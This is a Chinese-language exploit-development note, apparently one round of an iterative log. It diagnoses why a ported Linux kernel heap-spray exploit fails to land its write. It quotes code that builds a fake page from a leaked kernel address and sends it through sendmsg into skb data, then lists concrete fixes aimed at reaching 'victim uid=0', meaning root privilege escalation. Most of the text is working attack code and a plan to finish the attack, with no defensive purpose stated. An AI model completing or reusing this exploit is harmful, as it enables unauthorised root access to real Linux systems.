# 43499 · 瓶颈的答案（round 79-80）：页面从未进入内核堆

## 旧代码给出的机械（逐行）

```c
// 退役 spray.cpp
455: heap.skb_buffer = make_unique<unsigned char[]>(SKB_SEND_SIZE);   // 用户态缓冲
456: memset(skb_buf(), 0x41, SKB_SEND_SIZE);                         // 那个 0x41 图案的来源
340: for (chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE)
341:     p = skb_buf() + chunk + chunk_bias;                          // 每块写一份页面
600: uintptr_t base = leaked & ~(ORDER3_SIZE - 1);                   // base = 泄漏地址按 order-3 对齐
601: prepare_skb_payload(base, request);                            // 页面所有指针用这个 base 算
622: iov.iov_base = skb_buf(); iov.iov_len = SKB_SEND_SIZE;
629: sendmsg(pcp_shaping_sv[0], &msg, 0);                           // 发出 ⇒ 内核复制成 skb 数据
```

## 本树自己在头部承认了这个缺口（`memory/prepare_page.hpp`，逐字）

> NOT YET IN THE SEQUENCE: the retired tree prepared a payload inside the page and had a failure
> path for it. **That write is not ported yet**, so the phases here stop short of it deliberately —
> *a preparation that aligns an address and says where it stopped is honest; one that pretends to
> have prepared a page it did not touch is not.*

⇒ 本树的准备阶段**只对齐地址并报告 `base`**（真机：`prepare status=ok step=11 … base=0xffff800000008000`）✓，
  而**从不把页面写进那个缓冲、也不发它** ✗ —— 这正是"写永远不落"的根 ✓。

## 我的移植的错（一句话）

页面被我放在 **mmap** 里 ✓、`base` 靠 `alias_delta` **猜** ✗、**从未 `sendmsg`** ✗ ⇒ 内核看不见页面 ⇒
无论页面字节多正确（已逐字证对 ✓）、三步多齐全（都跑并 won ✓）、requeue 多同形（−1/EAGAIN ✓），**都不会有写入** ✓。

## 下一轮（按旧代码补这一环；判据仍是 uid=0）

1. 在准备阶段（`prepare_page` 的序列里，`NOT YET` 那一步）写页面：按 `ORDER3_SIZE` 分块、按 `chunk_bias` 偏移、
   用 `base + payload_delta`（= 退役的 `SKB_DATA_DELTA`，本树走 profile 的 `payload_delta` 键）算所有指针 ✓；
2. `base` 用**泄漏**（准备阶段已经给出 ✓），**不再用** `alias_delta` ✗；
3. 由 shaping 的第一端 `sendmsg` 把该缓冲发出 ✓（`shaping_plan` 已有"发送"这条动作 ✓，缺的是"发的内容"✗）；
4. 跑 ⇒ `victim uid=0`。
